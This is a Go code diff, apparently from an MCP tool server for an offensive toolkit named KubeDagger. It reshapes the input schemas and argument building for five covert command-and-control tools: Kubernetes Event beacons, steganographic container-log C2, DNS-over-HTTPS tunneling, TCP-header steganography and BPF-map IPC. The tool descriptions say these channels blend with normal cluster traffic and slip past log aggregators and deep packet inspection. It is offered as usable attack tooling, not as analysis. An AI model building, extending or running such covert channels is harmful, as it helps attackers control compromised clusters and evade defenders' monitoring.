@@ -13,10 +13,8 @@ import (
 // K8s Event C2
 
 type K8sEventC2Input struct {
-	Action    string `json:"action"`
 	Namespace string `json:"namespace,omitempty"`
-	Object    string `json:"object,omitempty"`
-	Data      string `json:"data,omitempty"`
+	Beacon    string `json:"beacon,omitempty"`
 }
 
 type K8sEventC2Tool struct {
@@ -30,32 +28,22 @@ func NewK8sEventC2(exec executor.Executor) *K8sEventC2Tool {
 func (t *K8sEventC2Tool) Name() string { return "kubedagger_k8s_event_c2" }
 
 func (t *K8sEventC2Tool) Description() string {
-	return "Use Kubernetes Events as a covert C2 channel. Commands are encoded in event messages and responses in event annotations. Blends with normal cluster event traffic and persists only briefly in etcd."
+	return "Use Kubernetes Events as a covert C2 beacon channel. The agent periodically creates innocuous-looking event objects in the target namespace and reads operator instructions encoded within them, blending with normal cluster event traffic."
 }
 
 func (t *K8sEventC2Tool) InputSchema() json.RawMessage {
 	return json.RawMessage(`{
 		"type": "object",
 		"properties": {
-			"action": {
-				"type": "string",
-				"enum": ["send", "receive", "setup", "teardown"],
-				"description": "C2 channel action"
-			},
 			"namespace": {
 				"type": "string",
-				"description": "Namespace for event objects"
+				"description": "Namespace for event objects (default: default)"
 			},
-			"object": {
+			"beacon": {
 				"type": "string",
-				"description": "Object reference for events"
-			},
-			"data": {
-				"type": "string",
-				"description": "Data to send via event channel"
+				"description": "Beacon interval as a Go duration string, e.g. '30s' (default: 30s)"
 			}
-		},
-		"required": ["action"]
+		}
 	}`)
 }
 
@@ -68,22 +56,16 @@ func (t *K8sEventC2Tool) Execute(ctx context.Context, params json.RawMessage) (*
 	if err := validateNamespace(input.Namespace); err != nil {
 		return errorResult(err.Error()), nil
 	}
-	if err := validateSafeString(input.Object, "object"); err != nil {
-		return errorResult(err.Error()), nil
-	}
-	if err := validateSafeString(input.Data, "data"); err != nil {
+	if err := validateSafeString(input.Beacon, "beacon"); err != nil {
 		return errorResult(err.Error()), nil
 	}
 
-	args := []string{"k8s-event-c2", "--action", input.Action}
+	args := []string{"k8s-event-c2"}
 	if input.Namespace != "" {
 		args = append(args, "--namespace", input.Namespace)
 	}
-	if input.Object != "" {
-		args = append(args, "--object", input.Object)
-	}
-	if input.Data != "" {
-		args = append(args, "--data", input.Data)
+	if input.Beacon != "" {
+		args = append(args, "--beacon", input.Beacon)
 	}
 
 	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
@@ -97,7 +79,7 @@ func (t *K8sEventC2Tool) Execute(ctx context.Context, params json.RawMessage) (*
 
 	output := strings.TrimSpace(string(result.Stdout))
 	var sb strings.Builder
-	fmt.Fprintf(&sb, "## KubeDagger K8s Event C2: %s\n\n", input.Action)
+	sb.WriteString("## KubeDagger K8s Event C2\n\n")
 	if output == "" {
 		sb.WriteString("Channel active.\n")
 	} else {
@@ -114,10 +96,8 @@ func (t *K8sEventC2Tool) Execute(ctx context.Context, params json.RawMessage) (*
 // Container Log C2
 
 type ContainerLogC2Input struct {
-	Action    string `json:"action"`
-	Pod       string `json:"pod,omitempty"`
-	Namespace string `json:"namespace,omitempty"`
-	Data      string `json:"data,omitempty"`
+	Container string `json:"container"`
+	Encoding  string `json:"encoding,omitempty"`
 }
 
 type ContainerLogC2Tool struct {
@@ -131,32 +111,24 @@ func NewContainerLogC2(exec executor.Executor) *ContainerLogC2Tool {
 func (t *ContainerLogC2Tool) Name() string { return "kubedagger_container_log_c2" }
 
 func (t *ContainerLogC2Tool) Description() string {
-	return "Use container stdout/stderr logs as a covert C2 channel. Steganographically encodes commands in log output that appears normal to log aggregators but carries C2 payloads."
+	return "Use container stdout/stderr logs as a covert C2 channel. Steganographically encodes commands in container log output using whitespace, unicode, or base85 steganography, appearing normal to log aggregators while carrying C2 payloads."
 }
 
 func (t *ContainerLogC2Tool) InputSchema() json.RawMessage {
 	return json.RawMessage(`{
 		"type": "object",
 		"properties": {
-			"action": {
+			"container": {
 				"type": "string",
-				"enum": ["send", "receive", "setup", "teardown"],
-				"description": "C2 channel action"
+				"description": "Target container to use for the log channel (required)"
 			},
-			"pod": {
+			"encoding": {
 				"type": "string",
-				"description": "Pod to use for log channel"
-			},
-			"namespace": {
-				"type": "string",
-				"description": "Pod namespace"
-			},
-			"data": {
-				"type": "string",
-				"description": "Data to encode in logs"
+				"enum": ["base85", "whitespace", "unicode"],
+				"description": "Steganographic encoding for the C2 data (default: base85)"
 			}
 		},
-		"required": ["action"]
+		"required": ["container"]
 	}`)
 }
 
@@ -166,25 +138,16 @@ func (t *ContainerLogC2Tool) Execute(ctx context.Context, params json.RawMessage
 		return errorResult("invalid input: " + err.Error()), nil
 	}
 
-	if err := validateSafeString(input.Pod, "pod"); err != nil {
-		return errorResult(err.Error()), nil
+	if input.Container == "" {
+		return errorResult("container is required"), nil
 	}
-	if err := validateNamespace(input.Namespace); err != nil {
-		return errorResult(err.Error()), nil
-	}
-	if err := validateSafeString(input.Data, "data"); err != nil {
+	if err := validateSafeString(input.Container, "container"); err != nil {
 		return errorResult(err.Error()), nil
 	}
 
-	args := []string{"container-log-c2", "--action", input.Action}
-	if input.Pod != "" {
-		args = append(args, "--pod", input.Pod)
-	}
-	if input.Namespace != "" {
-		args = append(args, "--namespace", input.Namespace)
-	}
-	if input.Data != "" {
-		args = append(args, "--data", input.Data)
+	args := []string{"container-log-c2", "--container", input.Container}
+	if input.Encoding != "" {
+		args = append(args, "--encoding", input.Encoding)
 	}
 
 	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
@@ -198,7 +161,7 @@ func (t *ContainerLogC2Tool) Execute(ctx context.Context, params json.RawMessage
 
 	output := strings.TrimSpace(string(result.Stdout))
 	var sb strings.Builder
-	fmt.Fprintf(&sb, "## KubeDagger Container Log C2: %s\n\n", input.Action)
+	sb.WriteString("## KubeDagger Container Log C2\n\n")
 	if output == "" {
 		sb.WriteString("Channel active.\n")
 	} else {
@@ -215,10 +178,8 @@ func (t *ContainerLogC2Tool) Execute(ctx context.Context, params json.RawMessage
 // DoH C2
 
 type DoHC2Input struct {
-	Action   string `json:"action"`
 	Resolver string `json:"resolver,omitempty"`
-	Domain   string `json:"domain,omitempty"`
-	Data     string `json:"data,omitempty"`
+	Domain   string `json:"domain"`
 }
 
 type DoHC2Tool struct {
@@ -239,25 +200,17 @@ func (t *DoHC2Tool) InputSchema() json.RawMessage {
 	return json.RawMessage(`{
 		"type": "object",
 		"properties": {
-			"action": {
-				"type": "string",
-				"enum": ["send", "receive", "setup", "teardown"],
-				"description": "C2 channel action"
-			},
 			"resolver": {
 				"type": "string",
-				"description": "DoH resolver URL"
+				"enum": ["cloudflare", "google"],
+				"description": "DoH resolver to use (default: cloudflare)"
 			},
 			"domain": {
 				"type": "string",
-				"description": "Domain for DNS tunneling"
-			},
-			"data": {
-				"type": "string",
-				"description": "Data to send via DoH"
+				"description": "C2 domain for DNS tunneling (required)"
 			}
 		},
-		"required": ["action"]
+		"required": ["domain"]
 	}`)
 }
 
@@ -267,25 +220,19 @@ func (t *DoHC2Tool) Execute(ctx context.Context, params json.RawMessage) (*mcp.T
 		return errorResult("invalid input: " + err.Error()), nil
 	}
 
+	if input.Domain == "" {
+		return errorResult("domain is required"), nil
+	}
 	if err := validateSafeString(input.Resolver, "resolver"); err != nil {
 		return errorResult(err.Error()), nil
 	}
 	if err := validateSafeString(input.Domain, "domain"); err != nil {
 		return errorResult(err.Error()), nil
 	}
-	if err := validateSafeString(input.Data, "data"); err != nil {
-		return errorResult(err.Error()), nil
-	}
 
-	args := []string{"doh-c2", "--action", input.Action}
+	args := []string{"doh-c2", "--domain", input.Domain}
 	if input.Resolver != "" {
 		args = append(args, "--resolver", input.Resolver)
-	}
-	if input.Domain != "" {
-		args = append(args, "--domain", input.Domain)
-	}
-	if input.Data != "" {
-		args = append(args, "--data", input.Data)
 	}
 
 	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
@@ -299,7 +246,7 @@ func (t *DoHC2Tool) Execute(ctx context.Context, params json.RawMessage) (*mcp.T
 
 	output := strings.TrimSpace(string(result.Stdout))
 	var sb strings.Builder
-	fmt.Fprintf(&sb, "## KubeDagger DoH C2: %s\n\n", input.Action)
+	sb.WriteString("## KubeDagger DoH C2\n\n")
 	if output == "" {
 		sb.WriteString("Channel active.\n")
 	} else {
@@ -316,11 +263,9 @@ func (t *DoHC2Tool) Execute(ctx context.Context, params json.RawMessage) (*mcp.T
 // TCP Stego
 
 type TCPStegoInput struct {
-	Action   string `json:"action"`
-	Target   string `json:"target,omitempty"`
-	Port     int    `json:"port,omitempty"`
-	Data     string `json:"data,omitempty"`
-	Method   string `json:"method,omitempty"`
+	Data          string `json:"data,omitempty"`
+	Dest          string `json:"dest,omitempty"`
+	BitsPerPacket string `json:"bits_per_packet,omitempty"`
 }
 
 type TCPStegoTool struct {
@@ -334,37 +279,27 @@ func NewTCPStego(exec executor.Executor) *TCPStegoTool {
 func (t *TCPStegoTool) Name() string { return "kubedagger_tcp_stego" }
 
 func (t *TCPStegoTool) Description() string {
-	return "Hide C2 data in TCP header fields (sequence numbers, timestamps, window sizes) using steganography. Data is embedded in legitimate-looking TCP flows that pass deep packet inspection."
+	return "Hide C2 data in TCP/IP header fields using steganography. Data is embedded in legitimate-looking TCP flows to an ip:port destination, passing deep packet inspection that inspects payloads only."
 }
 
 func (t *TCPStegoTool) InputSchema() json.RawMessage {
 	return json.RawMessage(`{
 		"type": "object",
 		"properties": {
-			"action": {
-				"type": "string",
-				"enum": ["send", "receive", "setup", "teardown"],
-				"description": "Stego channel action"
-			},
-			"target": {
-				"type": "string",
-				"description": "Target host for stego traffic"
-			},
-			"port": {
-				"type": "integer",
-				"description": "Target port"
-			},
 			"data": {
 				"type": "string",
-				"description": "Data to embed"
+				"description": "Data to embed in TCP headers"
 			},
-			"method": {
+			"dest": {
 				"type": "string",
-				"enum": ["seq", "timestamp", "window", "urgent"],
-				"description": "Steganography method"
+				"description": "Destination as ip:port (e.g. '10.0.0.1:443')"
+			},
+			"bits_per_packet": {
+				"type": "string",
+				"enum": ["2", "4"],
+				"description": "Stego bits carried per packet (default: 2)"
 			}
-		},
-		"required": ["action"]
+		}
 	}`)
 }
 
@@ -374,25 +309,22 @@ func (t *TCPStegoTool) Execute(ctx context.Context, params json.RawMessage) (*mc
 		return errorResult("invalid input: " + err.Error()), nil
 	}
 
-	if err := validateSafeString(input.Target, "target"); err != nil {
-		return errorResult(err.Error()), nil
-	}
 	if err := validateSafeString(input.Data, "data"); err != nil {
 		return errorResult(err.Error()), nil
 	}
+	if err := validateIPPort(input.Dest); err != nil {
+		return errorResult(err.Error()), nil
+	}
 
-	args := []string{"tcp-stego", "--action", input.Action}
-	if input.Target != "" {
-		args = append(args, "--target", input.Target)
-	}
-	if input.Port > 0 {
-		args = append(args, "--port", fmt.Sprintf("%d", input.Port))
-	}
+	args := []string{"tcp-stego"}
 	if input.Data != "" {
 		args = append(args, "--data", input.Data)
 	}
-	if input.Method != "" {
-		args = append(args, "--method", input.Method)
+	if input.Dest != "" {
+		args = append(args, "--dest", input.Dest)
+	}
+	if input.BitsPerPacket != "" {
+		args = append(args, "--bits-per-packet", input.BitsPerPacket)
 	}
 
 	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
@@ -406,7 +338,7 @@ func (t *TCPStegoTool) Execute(ctx context.Context, params json.RawMessage) (*mc
 
 	output := strings.TrimSpace(string(result.Stdout))
 	var sb strings.Builder
-	fmt.Fprintf(&sb, "## KubeDagger TCP Stego: %s\n\n", input.Action)
+	sb.WriteString("## KubeDagger TCP Stego\n\n")
 	if output == "" {
 		sb.WriteString("Channel active.\n")
 	} else {
@@ -423,9 +355,9 @@ func (t *TCPStegoTool) Execute(ctx context.Context, params json.RawMessage) (*mc
 // BPF IPC
 
 type BPFIPCInput struct {
-	Action  string `json:"action"`
-	MapName string `json:"map_name,omitempty"`
-	Data    string `json:"data,omitempty"`
+	Action  string `json:"action,omitempty"`
+	Channel string `json:"channel,omitempty"`
+	Message string `json:"message,omitempty"`
 }
 
 type BPFIPCTool struct {
@@ -448,19 +380,18 @@ func (t *BPFIPCTool) InputSchema() json.RawMessage {
 		"properties": {
 			"action": {
 				"type": "string",
-				"enum": ["send", "receive", "create", "destroy", "status"],
-				"description": "BPF IPC action"
+				"enum": ["send", "recv", "list"],
+				"description": "BPF IPC action (default: send)"
 			},
-			"map_name": {
+			"channel": {
 				"type": "string",
-				"description": "BPF map name for IPC"
+				"description": "BPF map channel name for IPC (default: default)"
 			},
-			"data": {
+			"message": {
 				"type": "string",
-				"description": "Data to write to BPF map"
+				"description": "Message to send on the channel (for action=send)"
 			}
-		},
-		"required": ["action"]
+		}
 	}`)
 }
 
@@ -470,19 +401,22 @@ func (t *BPFIPCTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.
 		return errorResult("invalid input: " + err.Error()), nil
 	}
 
-	if err := validateSafeString(input.MapName, "map_name"); err != nil {
+	if err := validateSafeString(input.Channel, "channel"); err != nil {
 		return errorResult(err.Error()), nil
 	}
-	if err := validateSafeString(input.Data, "data"); err != nil {
+	if err := validateSafeString(input.Message, "message"); err != nil {
 		return errorResult(err.Error()), nil
 	}
 
-	args := []string{"bpf-ipc", "--action", input.Action}
-	if input.MapName != "" {
-		args = append(args, "--map-name", input.MapName)
+	args := []string{"bpf-ipc"}
+	if input.Action != "" {
+		args = append(args, "--action", input.Action)
 	}
-	if input.Data != "" {
-		args = append(args, "--data", input.Data)
+	if input.Channel != "" {
+		args = append(args, "--channel", input.Channel)
+	}
+	if input.Message != "" {
+		args = append(args, "--message", input.Message)
 	}
 
 	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
@@ -496,7 +430,7 @@ func (t *BPFIPCTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.
 
 	output := strings.TrimSpace(string(result.Stdout))
 	var sb strings.Builder
-	fmt.Fprintf(&sb, "## KubeDagger BPF IPC: %s\n\n", input.Action)
+	sb.WriteString("## KubeDagger BPF IPC\n\n")
 	if output == "" {
 		sb.WriteString("IPC channel active.\n")
 	} else {
